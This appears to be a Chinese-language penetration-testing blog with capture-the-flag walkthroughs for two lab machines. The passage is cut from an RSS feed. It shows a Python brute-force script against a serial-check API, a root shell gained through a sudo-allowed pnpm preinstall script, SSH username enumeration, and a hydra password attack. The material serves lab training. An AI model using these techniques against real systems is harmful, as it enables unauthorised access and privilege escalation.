‚îú‚îÄ‚îÄ package.json
‚îú‚îÄ‚îÄ pnpm-lock.yaml
‚îî‚îÄ‚îÄ public
    ‚îú‚îÄ‚îÄ css
    ‚îÇ   ‚îî‚îÄ‚îÄ all.min.css
    ‚îú‚îÄ‚îÄ index.html
    ‚îú‚îÄ‚îÄ js
    ‚îÇ   ‚îú‚îÄ‚îÄ index.js
    ‚îÇ   ‚îú‚îÄ‚îÄ md5.min.js
    ‚îÇ   ‚îî‚îÄ‚îÄ seedrandom.min.js
    ‚îú‚îÄ‚îÄ robots.txt
    ‚îî‚îÄ‚îÄ webfonts
        ‚îú‚îÄ‚îÄ fa-brands-400.ttf
        ‚îú‚îÄ‚îÄ fa-brands-400.woff2
        ‚îú‚îÄ‚îÄ fa-regular-400.ttf
        ‚îú‚îÄ‚îÄ fa-regular-400.woff2
        ‚îú‚îÄ‚îÄ fa-solid-900.ttf
        ‚îú‚îÄ‚îÄ fa-solid-900.woff2
        ‚îú‚îÄ‚îÄ fa-v4compatibility.ttf
        ‚îî‚îÄ‚îÄ fa-v4compatibility.woff2

5 directories, 17 files
                 
```

ÂÖàÁúãapp.js

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/2026bak]
‚îî‚îÄ$ cat app.js                                
const express = require('express');
const path = require('path');

const app = express();
const port = process.env.PORT || 8080;

// Ëß£Êûê JSON ËØ∑Ê±Ç‰Ωì
app.use(express.json());

// ÈùôÊÄÅÊñá‰ª∂ÊúçÂä°
app.use(express.static('public'));

// /checkSN Ë∑ØÁî± (POSTËØ∑Ê±Ç)
app.post('/checkSN', (req, res) =&gt; {
    // ‰ªéËØ∑Ê±Ç‰Ωì‰∏≠Ëé∑Âèñ SN ÂèÇÊï∞
    const sn = req.body.sn;

    if (sn) {
        if (sn === 'xxxxxxxxxxxxxxxxxxxxxxxxx') {
            res.json({
                code: 200,
                data: 'xxxxxx:XXXXX',
                msg: 'Success: Valid SN '
            });
        } else {
            res.json({
                code: 401,
                data: null,
                msg: 'Error: Invalid SN'
            });
        }
    } else {
        res.status(400).json({
            code: 400,
            data: null,
            msg: 'Missing sn parameter in request body'
        });
    }
});
app.use((req, res) =&gt; {
    res.status(404).json({
        code: 404,
        data: null,
        msg: '404 Not Found'
    });
});

app.listen(port, () =&gt; {
    console.log(`Server running at http://localhost:${port}`);
});                                                                                                                                                                                   
```

Ëß£ÊûêÊüê‰∫õÂ≠óÁ¨¶ÔºåÁÑ∂Âêé‰ª•POSTËØ∑Ê±ÇÂèëÈÄÅÂà∞/checkSN

ÁªßÁª≠ÁúãÔºåÁúãpublic/js/index.js

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/2026bak]
‚îî‚îÄ$ cat public/js/index.js 
document.addEventListener('DOMContentLoaded', function () {
    const snInput = document.getElementById('sn-input');
    const verifyBtn = document.getElementById('verify-btn');
    const responseText = document.getElementById('response-text');
    const statusIcon = document.getElementById('status-icon');
    function cleanInput(value) {
        return value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
    }
    function formatSerialNumber(value) {
        let cleanValue = cleanInput(value);
        let formatted = '';
        for (let i = 0; i &lt; cleanValue.length; i++) {
            if (i &gt; 0 &amp;&amp; i % 5 === 0) {
                formatted += '-';
            }
            formatted += cleanValue[i];
        }
        return formatted;
    }
    snInput.addEventListener('input', function () {
        const startPos = snInput.selectionStart;
        const formattedValue = formatSerialNumber(snInput.value);
        snInput.value = formattedValue;
        let newPos = startPos;
        if (startPos === 6 || startPos === 12 || startPos === 18 || startPos === 24) {
            newPos = startPos + 1;
        }
        snInput.setSelectionRange(newPos, newPos);
    });
    snInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            verifySerialNumber();
        }
    });

    verifyBtn.addEventListener('click', verifySerialNumber);
    function verifySerialNumber() {
        const serialNumber = cleanInput(snInput.value);
        statusIcon.className = 'status-icon pending';
        statusIcon.innerHTML = '&lt;i class='fas fa-circle-notch fa-spin'&gt;&lt;/i&gt;';
        responseText.textContent = 'È™åËØÅ‰∏≠ÔºåËØ∑Á®çÂÄô...';
        if (serialNumber.length !== 25) {
            statusIcon.className = 'status-icon error';
            statusIcon.innerHTML = '&lt;i class='fas fa-exclamation-triangle'&gt;&lt;/i&gt;';
            responseText.textContent = 'ÈîôËØØ: Â∫èÂàóÂè∑ÈïøÂ∫¶‰∏çÊ≠£Á°Æ (ÈúÄË¶Å25‰∏™Â≠óÁ¨¶)';
            return;
        }
        let hashSN = CreatehashSN(snInput.value);
        // console.log('hashSN:', hashSN);

        setTimeout(function () {
            fetch('/checkSN', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ sn: hashSN })
            })
                .then(response =&gt; response.json())
                .then(data =&gt; {
                    console.log('checkSN response:', data);
                    if (data.code === 200) {
                        statusIcon.className = 'status-icon success';
                        statusIcon.innerHTML = '&lt;i class='fas fa-check-circle'&gt;&lt;/i&gt;';
                        responseText.innerHTML = `Â∫èÂàóÂè∑ &lt;strong&gt;${snInput.value}&lt;/strong&gt; &lt;br&gt;È™åËØÅÊàêÂäüÔºÅ&lt;br&gt; ${data.data}`;
                    }
                    else {
                        statusIcon.className = 'status-icon error';
                        statusIcon.innerHTML = '&lt;i class='fas fa-times-circle'&gt;&lt;/i&gt;';
                        responseText.innerHTML = `Â∫èÂàóÂè∑ &lt;strong&gt;${snInput.value}&lt;/strong&gt; È™åËØÅÂ§±Ë¥•ÔºÅ&lt;br&gt;Áä∂ÊÄÅ: Êó†ÊïàÊàñÂ∑≤Ë¢´‰ΩøÁî®`;
                    }
                });
        }, 300);
    }
});

// ÈöèÊú∫Êï∞ÁîüÊàêÂáΩÊï∞Ôºà‰ΩøÁî®Math.seedrandomÔºâ
function R(seed, min = 100, max = 200) {
    // const rng = new Math.seedrandom(seed);
    // // return Math.floor(rng() * (max - min + 1)) + min;
    // return Math.floor((max - min + 1)) + min;
    return seed + min + max;
}
function CreatehashSN(SN) {
    // if(SN.length!== 29)
    // {
    //     return 'Â∫èÂàóÂè∑ÈïøÂ∫¶‰∏çÊ≠£Á°Æ (ÈúÄË¶Å25‰∏™Â≠óÁ¨¶)';
    // }
    console.log('SN', SN);
    const VI = 'Jkdsfojweflk0024564555*';
    const KEY = '6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC';

    let a = [];
    let b = [];
    let e = [];
    let f = [];
    let z = [];

    // Â§ÑÁêÜSNÂ≠óÁ¨¶‰∏≤
    for (let i = 0; i &lt; SN.length; i++) {
        const charCode = SN.charCodeAt(i);

        if (i &gt;= 0 &amp;&amp; i &lt;= 4) {
            a.push(R(charCode));
            b.push(R(charCode));
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i &gt;= 5 &amp;&amp; i &lt;= 9) {
            b.push(R(charCode));
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i &gt;= 10 &amp;&amp; i &lt;= 14) {
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i &gt;= 15 &amp;&amp; i &lt;= 19) {
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i &gt;= 20 &amp;&amp; i &lt;= 24) {
            z.push(R(charCode));
        }
    }
    // console.log('a', a);
    // console.log('b', b);
    // console.log('e', e);
    // console.log('f', f);
    // console.log('z', z);
    // e = Math.max(f, g);
    if (a[0] &gt; a[2] || a[1] &gt; a[3]) {
        a[0] = Math.max(a[0], a[1], a[2], a[3], a[4]);
    } else {
        a[0] = Math.min(a[0], a[1], a[2], a[3], a[4]);
    }
    if (b[4] &gt; b[6]) {
        b[0] = Math.max(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    } else {
        b[0] = Math.min(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    }
    if (e[8] &gt; e[10] || e[9] &gt; e[11]) {
        e[0] = Math.max(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);
    } else {
        e[0] = Math.min(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);
    }
    if (f[0] &gt; f[10]) {
        f[0] = Math.max(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);
    } else {
        f[0] = Math.min(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);
    }
    if (z[15] &gt; z[17] || z[18] &gt; z[24]) {
        z[0] = Math.max(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);
    } else {
        z[0] = Math.min(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);
    }
    // console.log('a[0]', a[0]);
    // console.log('b[0]', b[0]);
    // console.log('e[0]', e[0]);
    // console.log('f[0]', f[0]);
    // console.log('z[0]', z[0]);
    let sum = 0;
    for (let i = 0; i &lt; a.length; i++) {
        sum += a[i]
    }
    // console.log('sum', sum);
    a[0] = (sum ^ a[0]) % 12;
    a[0] = KEY.charAt(a[0]);

    for (let i = 0; i &lt; b.length; i++) {
        sum += b[i]
    }
    // console.log('sum', sum);
    b[0] = (sum ^ b[0]) % 9;
    b[0] = KEY.charAt(b[0]);

    for (let i = 0; i &lt; e.length; i++) {
        sum += e[i]
    }
    // console.log('sum', sum);

    e[0] = (sum ^ e[0]) % 8;
    e[0] = KEY.charAt(e[0]);


    for (let i = 0; i &lt; f.length; i++) {
        sum += f[i]
    }
    // console.log('sum', sum);
    f[0] = (sum ^ f[0]) % 7;
    f[0] = KEY.charAt(f[0]);

    for (let i = 0; i &lt; z.length; i++) {
        sum += z[i]
    }
    // console.log('sum', sum);
    z[0] = (sum ^ z[0]) % 6;
    z[0] = VI.charAt(z[0]);

    // console.log('a[0]', a[0]);
    // console.log('b[0]', b[0]);
    // console.log('e[0]', e[0]);
    // console.log('f[0]', f[0]);
    // console.log('z[0]', z[0]);
    let hashSN = md5(a[0] + b[0] + e[0] + f[0] + z[0]);
    // console.log('hashSN', hashSN);
    return hashSN;
}
                                                               
```

‰ªñËøôhashSNÊúâÈóÆÈ¢òÔºåÊòØÂõ∫ÂÆöÁöÑÈáèÔºåÁàÜÁ†¥‰∏Ä‰∏ãÂ∞±Â•Ω‰∫Ü

ÂéªÁΩëÈ°µÊäì‰∏™ÂåÖ

![image-20250608115935547](https://7r1umphk.github.io/image/20250608115936018.webp)

Èöè‰æøËæìÁÇπÔºåÊäìÂåÖ

```
POST /checkSN HTTP/1.1
Host: 192.168.205.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.131:8080/
Content-Type: application/json
Content-Length: 41
Origin: http://192.168.205.131:8080
Connection: keep-alive
Priority: u=4

{'sn':'4818799e57fe67c963b90a99f797beae'}
```

ÁÑ∂Âêé‰∏¢ÁªôAIÂêßÔºå‰∏çÊÉ≥Ëá™Â∑±ÂÜô

ÁÑ∂ÂêéAIÁªôÁöÑÊúâÁÇπÂ∞èÈóÆÈ¢òÔºå‰∏çÊòæÁ§∫ÊØèÊ¨°ÁàÜÁ†¥Â∞±ÁÆó‰∫ÜÔºåÂ•ΩÂÉèÂÆÉÁàÜÁ†¥ÊàêÂäü‰∫Ü‰πü‰ºöÁªßÁª≠ÁàÜÁ†¥ÔºåËá™Â∑±Êîπ‰∏Ä‰∏ãÂêß

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/2026bak]                                                                                                                                             
‚îî‚îÄ$ vim bp.py                                                                                                                                                               
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/2026bak]
‚îî‚îÄ$ cat bp.py             
import hashlib
import json
import queue
import threading
import requests

KEY = '6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC'
VI = 'Jkdsfojweflk0024564555*'

def generate_all_hashes():
    hashes = []
    for i1 in range(12):
        s1 = KEY[i1]
        for i2 in range(9):
            s2 = KEY[i2]
            for i3 in range(8):
                s3 = KEY[i3]
                for i4 in range(7):
                    s4 = KEY[i4]
                    for i5 in range(6):
                        s5 = VI[i5]
                        s = s1 + s2 + s3 + s4 + s5
                        md5_hex = hashlib.md5(s.encode()).hexdigest()
                        hashes.append(md5_hex)
    return hashes

def worker(q, result, url):
    headers = {'Content-Type': 'application/json'}
    while not result and not q.empty():
        try:
            hash_sn = q.get_nowait()
            data = json.dumps({'sn': hash_sn})
            response = requests.post(url, headers=headers, data=data, timeout=5)
            if response.status_code == 200:
                try:
                    resp_data = response.json()
                    if resp_data.get('code') == 200:
                        result.append(hash_sn)
                        print(f'[+] Success! Found Valid SN: {hash_sn}')
                        return
                    else:
                        print(f'[-] Failed: {hash_sn} -&gt; {resp_data.get('msg', 'Unknown error')}')
                except json.JSONDecodeError:
                    print(f'[-] Failed (Invalid JSON): {hash_sn}')
            else:
                print(f'[-] Failed (HTTP {response.status_code}): {hash_sn}')
        except Exception as e:
            print(f'[!] Error with {hash_sn}: {str(e)}')
        finally:
            q.task_done()

if __name__ == '__main__':
    SERVER_URL = 'http://192.168.205.131:8080/checkSN'
    all_hashes = generate_all_hashes()
    print(f'Generated {len(all_hashes)} hashes. StartingÁàÜÁ†¥...')

    task_queue = queue.Queue()
    for h in all_hashes:
        task_queue.put(h)

    valid_hash = []
    num_threads = 8
    threads = []

    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(task_queue, valid_hash, SERVER_URL))
        t.daemon = True
        t.start()
        threads.append(t)

    task_queue.join()

    if valid_hash:
        print(f'[+] Valid hashSN found: {valid_hash[0]}')
    else:
        print('[-] No valid hashSN found.')
                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/2026bak]
‚îî‚îÄ$ python3 $_
Generated 36288 hashes. StartingÁàÜÁ†¥...
[-] Failed: 7e761b3333f90f1adb4b2bdb0192256f -&gt; Error: Invalid SN
ÁúÅÁï•
[+] Success! Found Valid SN: ee5a82db0f9bf1c1903821477e11c067
```

SN: ee5a82db0f9bf1c1903821477e11c067ÔºåÊàë‰ª¨ËØï‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/2026bak]
‚îî‚îÄ$ curl -X POST -H 'Content-Type: application/json' -d '{'sn': 'ee5a82db0f9bf1c1903821477e11c067'}' http://192.168.205.131:8080/checkSN
{'code':200,'data':'welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111','msg':'Success: Valid SN '}                                                                                      
```

ÁôªÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/2026bak]
‚îî‚îÄ$ ssh welcome@192.168.205.131
The authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.
ED25519 key fingerprint is SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:17: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.
welcome@192.168.205.131's password: 
=============================
Welcome!!!
QQ Group:660930334
=============================
lingdong:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

Êâæ‰ø°ÊÅØ

```
lingdong:~$ sudo -l
Matching Defaults entries for welcome on lingdong:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for welcome:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User welcome may run the following commands on lingdong:
    (ALL : ALL) NOPASSWD: /root/.local/share/pnpm/global-bin/pm2
    (ALL : ALL) NOPASSWD: /usr/bin/pnpm
```

ÁúãÊúâÊ≤°ÊúâÁé∞ÊàêÁöÑ

Ê≤°ÊâæÂà∞ÔºåÁúãÁúãÂ∏ÆÂä©ÊñáÊ°£

```
lingdong:~$ sudo /usr/bin/pnpm --help
Version 10.11.1 (compiled to binary; bundled Node.js v20.11.1)
Usage: pnpm [command] [flags]
       pnpm [ -h | --help | -v | --version ]

Manage your dependencies:
      add                  Installs a package and any packages that it depends on. By default, any new package is installed as a prod dependency
      import               Generates a pnpm-lock.yaml from an npm package-lock.json (or npm-shrinkwrap.json) file
   i, install              Install all dependencies for a project
  it, install-test         Runs a pnpm install followed immediately by a pnpm test
  ln, link                 Connect the local project to another one
      prune                Removes extraneous packages
  rb, rebuild              Rebuild a package
  rm, remove               Removes packages from node_modules and from the project's package.json
      unlink               Unlinks a package. Like yarn unlink but pnpm re-installs the dependency after removing the external link
  up, update               Updates packages to their latest version based on the specified range

Review your dependencies:
      audit                Checks for known security issues with the installed packages
      licenses             Check licenses in consumed packages
  ls, list                 Print all the versions of packages that are installed, as well as their dependencies, in a tree-structure
      outdated             Check for outdated packages

Run your scripts:
      exec                 Executes a shell command in scope of a project
      run                  Runs a defined package script
      start                Runs an arbitrary command specified in the package's 'start' property of its 'scripts' object
   t, test                 Runs a package's 'test' script, if one was provided

Other:
      cat-file             Prints the contents of a file based on the hash value stored in the index file
      cat-index            Prints the index file of a specific package from the store
      find-hash            Experimental! Lists the packages that include the file with the specified hash.
      pack                 Create a tarball from a package
      publish              Publishes a package to the registry
      root                 Prints the effective modules directory

Manage your store:
      store add            Adds new packages to the pnpm store directly. Does not modify any projects or files outside the store
      store path           Prints the path to the active store directory
      store prune          Removes unreferenced (extraneous, orphan) packages from the store
      store status         Checks for modified packages in the store

Options:
  -r, --recursive          Run the command for each project in the workspace.
```



ÁúãÁùÄÊúâÁÇπÂÉènpmÂïäÔºåËøôÁé©ÊÑèÂíånpmÂ∑Æ‰∏çÂ§öÂêßÔºüËØïËØï

![image-20250608122239857](https://7r1umphk.github.io/image/20250608122240292.webp)

```
lingdong:~$ TF=$(mktemp -d)
lingdong:~$ echo '{'scripts': {'preinstall': '/bin/sh'}}' &gt; $TF/package.json
lingdong:~$ sudo pnpm -C $TF --unsafe-perm i
Already up to date

&gt; @ preinstall /tmp/tmp.ggFJFL
&gt; /bin/sh

/tmp/tmp.ggFJFL # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

ÂèØ‰ª•ÔºåÊãø‰∏Ä‰∏ãflag

```
/tmp/tmp.ggFJFL # cat /root/root.txt 
flag{root-b89ed76b27e91ad5d773ddadae256072}
/tmp/tmp.ggFJFL # cat /home/welcome/user.txt 
flag{user-afc8b494c5ba167971f10274f5a81534}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_bughash.html</guid><pubDate>Fri, 27 Jun 2025 09:29:30 +0000</pubDate></item><item><title>vulnyx_Denied</title><link>https://7r1UMPHK.github.io/post/vulnyx_Denied.html</link><description># 1. ‰ø°ÊÅØÊî∂ÈõÜ - ÁõÆÊ†áÈîÅÂÆöÔºÅ

![image-20250519113211432](https://7r1umphk.github.io/image/20250519113211569.webp)

ËøôÈù∂Êú∫Á∫ØÂ§çÁé∞ÔºåÂõ†‰∏∫ÊàëÈÉΩÁü•ÈÅìÂÆÉÂè£Âú®Âì™‰∫Ü„ÄÇ‰∏çËøáÔºåÊµÅÁ®ãËøòÊòØË¶ÅËµ∞‰∏ÄÈÅçÁöÑÂòõÔºÅ

### 1. ‰ø°ÊÅØÊî∂ÈõÜ - ÁõÆÊ†áÈîÅÂÆöÔºÅ

ËÄÅ‰∏ÄÂ•óÔºåÂÖàÁî® `arp-scan` ÁúãÁúãÂÜÖÁΩëÈáåË∞ÅÊòØÁõÆÊ†á„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo arp-scan -l        
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.217 08:00:27:63:80:7c       PCS Systemtechnik GmbH # &lt;--- Â∞±ÊòØ‰Ω†‰∫ÜÔºÅ
192.168.205.254 00:50:56:ed:bd:56       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded
```
IPÂú∞ÂùÄ `192.168.205.217` Âà∞ÊâãÔºåÊé•ÁùÄ `nmap` Â§ßÊ≥ï‰º∫ÂÄôÔºåÁúãÁúãÂºÄ‰∫Ü‰∫õÂï•Á´ØÂè£ÔºåË∑ë‰∫ÜÂï•ÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p22,80,8080 -sV 192.168.205.217
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 23:33 EDT
Nmap scan report for denied.nyx (192.168.205.217)
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:63:80:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
```
ÂºÄ‰∫Ü 22 (SSH), 80 (HTTP), ËøòÊúâ‰∏™ 8080 (‰πüÊòØHTTP)„ÄÇÈÉΩÊòØ Apache 2.4.62ÔºåSSH ÁâàÊú¨ÊòØ OpenSSH 9.2p1„ÄÇ

### 2. Web ÊúçÂä°Êé¢Êµã - Apache Ê¨¢ËøéÊÇ®ÔºÅ

ÂÖà `curl` ‰∏Ä‰∏ã 80 Âíå 8080 Á´ØÂè£ÁúãÁúã„ÄÇ‰∏§‰∏™Á´ØÂè£ÈÉΩÊòØ Apache ÁöÑÈªòËÆ§Ê¨¢ËøéÈ°µÈù¢Ôºå‰∏ÄÊ®°‰∏ÄÊ†∑„ÄÇÁúãÊù•Ê≤°Âï•ÁâπÂà´ÁöÑ‰∏úË•ø„ÄÇ
Êé•ÁùÄ‰∏äÁõÆÂΩïÁàÜÁ†¥ÔºåÁî® `gobuster` Êâ´‰∫Ü‰∏ÄÂúàÔºåÊç¢‰∫ÜÂ•ΩÂá†‰∏™Â≠óÂÖ∏ÔºåÂåÖÊã¨ `directory-list-2.3-medium.txt`, `directory-list-2.3-big.txt`ÔºåÁîöËá≥ÊàëËá™Â∑±ÊîπÁöÑÂÄíÂ∫è `hbig.txt`ÔºåËøòËØï‰∫ÜÂêÑÁßçÂ∏∏ËßÅÁöÑÊâ©Â±ïÂêç„ÄÇ

```bash
gobuster dir -u http://192.168.205.217:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,html,zip # Note: Log had 80, but context implies 8080
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/hbig.txt -x php,txt,html,zip,bak,old,conf,cgi,sh,log,.htaccess
```
ÁªìÊûúÊòØ...Âï•‰πüÊ≤°Êâ´Âá∫Êù•„ÄÇWeb ËøôËæπÁúãÊù•ÊòØÊù°Ê≠ªËÉ°Âêå„ÄÇËøòËØï‰∫Ü‰∏ãDNSÂ≠êÂüüÂêçÁàÜÁ†¥Ôºå‰πüÊ≤°Âï•ÂèëÁé∞„ÄÇ

```bash
gobuster dns -d http://disguise.hmv/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### 3. SSH Á™ÅÁ†¥ - Áî®Êà∑ÂêçÊûö‰∏æ‰∏éÁàÜÁ†¥

Web Ê≤°ÊàèÔºåÈÇ£Â∞±Âè™ËÉΩ‰ªé SSH ‰∏ãÊâã‰∫Ü„ÄÇÂÖàËØïËØï `root` Áî®Êà∑„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ssh root@192.168.205.217
root@192.168.205.217: Permission denied (publickey).
```
ÊèêÁ§∫ `Permission denied (publickey)`ÔºåÁúãÊù• `root` Áî®Êà∑ÊòØÁ¶ÅÊ≠¢ÂØÜÁ†ÅÁôªÂΩïÔºåÂº∫Âà∂Áî®ÂØÜÈí•„ÄÇ

ËøôÊó∂ÂÄôÊàëÊÉ≥Ëµ∑‰∫ÜÊò®Â§©ÁúãÂà∞ÁöÑ ll04567 Â§ß‰Ω¨ÁöÑÊÄùË∑Ø...
![image-20250519113954961](https://7r1umphk.github.io/image/20250519113955108.webp)
ÂÆ≥ÔºåÊò®Â§©‰∏∫‰ªÄ‰πàË¶ÅÁúãÂà∞ÔºåÊ≤°ÁúãÂà∞Â∞±ÂèØ‰ª•Ëá™Â∑±Êë∏Á¥¢‰∏Ä‰∏ã‰∫Ü„ÄÇÊó¢ÁÑ∂ÊòØÂ§çÁé∞ÔºåÈÇ£Â∞±ÊåâËøô‰∏™ÊÄùË∑ØËµ∞„ÄÇ
Â§ß‰Ω¨ÁöÑÊÄùË∑ØÊòØÂ≠òÂú®‰∏Ä‰∏™ÂèØ‰ª•ÂØÜÁ†ÅÁôªÂΩïÁöÑÊôÆÈÄöÁî®Êà∑„ÄÇÁî® `seclists` ÈáåÁöÑÁî®Êà∑ÂêçÂ≠óÂÖ∏Â∞ùËØïÊûö‰∏æ‰∏Ä‰∏ãÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ for i in $(cat /usr/share/seclists/Usernames/Names/names.txt);do ssh $i@192.168.205.217 ;done
# ... (Â§ßÈáèÂ∞ùËØï) ...
akira@192.168.205.217's password: 
```
(ËøôÈáåÊâãÂä® `Ctrl+C` ÂÅúÊ≠¢Êûö‰∏æ)
Êûö‰∏æÂà∞Áî®Êà∑ `akira` ÁöÑÊó∂ÂÄôÔºåSSH ÂÆ¢Êà∑Á´ØÊèêÁ§∫ËæìÂÖ•ÂØÜÁ†ÅÔºåËÄå‰∏çÊòØÂÉèÂÖ∂‰ªñÁî®Êà∑ÈÇ£Ê†∑Áõ¥Êé• `Permission denied (publickey)`„ÄÇËøôËØ¥Êòé `akira` Áî®Êà∑Â≠òÂú®ÔºåÂπ∂‰∏îÂÖÅËÆ∏ÂØÜÁ†ÅÁôªÂΩïÔºÅ

ÊâæÂà∞Áî®Êà∑Âêç `akira`ÔºåÊé•‰∏ãÊù•Â∞±ÊòØÁ•≠Âá∫ `hydra` Â§ßÊ≥ïÁàÜÁ†¥ÂØÜÁ†Å‰∫Ü„ÄÇÁî®‰∫Ü‰∏Ä‰∏™Â∏∏Áî®ÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ `5000q.txt`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ hydra -l akira -P 5000q.txt ssh://192.168.205.217 -V -I          
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-18 23:41:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5000 login tries (l:1/p:5000), ~313 tries per task
[DATA] attacking ssh://192.168.205.217:22/
[ATTEMPT] target 192.168.205.217 - login 'akira' - pass '123456' - 1 of 5000 [child 0] (0/0)
# ... (Â§ßÈáèÂ∞ùËØïËæìÂá∫) ...
[ATTEMPT] target 192.168.205.217 - login 'akira' - pass 'shakira' - 568 of 5003 [child 7] (0/3)
[22][ssh] host: 192.168.205.217   login: akira   password: shakira
^C                                                                                                                                                                                   
```
Bingo! `hydra` ÊàêÂäüÁàÜÂá∫ÂØÜÁ†Å `akira:shakira`„ÄÇ

Ëµ∂Á¥ßÁôªÂΩïÔºÅ
```bash
